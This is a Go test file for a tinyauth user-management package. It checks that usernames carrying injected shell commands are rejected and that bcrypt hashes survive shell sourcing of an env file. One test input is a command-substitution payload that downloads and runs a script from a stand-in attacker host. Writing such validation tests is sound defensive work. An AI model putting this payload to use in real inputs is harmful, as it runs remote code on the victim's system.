package tinyauthusers

import (
	"os/exec"
	"strings"
	"testing"
)

func TestAddUserRejectsUnsafeName(t *testing.T) {
	path := t.TempDir() + "/users.json"
	err := AddUser(path, "x$(curl http://attacker/x|sh)y", "password123")
	if err == nil {
		t.Fatalf("AddUser(malicious name) = nil error, want a validation error")
	}
	if err := AddUser(path, "normal-user_1@example.com", "password123"); err != nil {
		t.Fatalf("AddUser(normal name) = %v, want success", err)
	}
}

// TestRenderEnvFileSurvivesShellSourcing guards against a real bug: a
// bcrypt hash's own `$2a$10$...` prefix looks like shell parameter
// expansion, so an unquoted TINYAUTH_AUTH_USERS= assignment gets silently
// mangled the moment tinyauth.default.sh `source`s this file - every
// router-manager-created tinyauth user would be unable to log in.
func TestRenderEnvFileSurvivesShellSourcing(t *testing.T) {
	envPath := t.TempDir() + "/env"
	users := []User{
		{Name: "alice", PasswordHash: "$2a$10$abcdefghijklmnopqrstuuVzz9x1y2z3a4b5c6d7e8f9g0h1i2j3k"},
		{Name: "bob", PasswordHash: "$2a$10$0123456789ABCDEFGHIJKLzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz"},
	}
	if err := RenderEnvFile(envPath, users); err != nil {
		t.Fatalf("RenderEnvFile() = %v", err)
	}

	want := "alice:" + users[0].PasswordHash + ",bob:" + users[1].PasswordHash
	out, err := exec.Command("sh", "-c", ". "+envPath+" && printf '%s' \"$TINYAUTH_AUTH_USERS\"").CombinedOutput()
	if err != nil {
		t.Fatalf("sourcing env file failed: %v (output: %s)", err, out)
	}
	if got := strings.TrimSpace(string(out)); got != want {
		t.Fatalf("TINYAUTH_AUTH_USERS after sourcing = %q, want %q", got, want)
	}
}
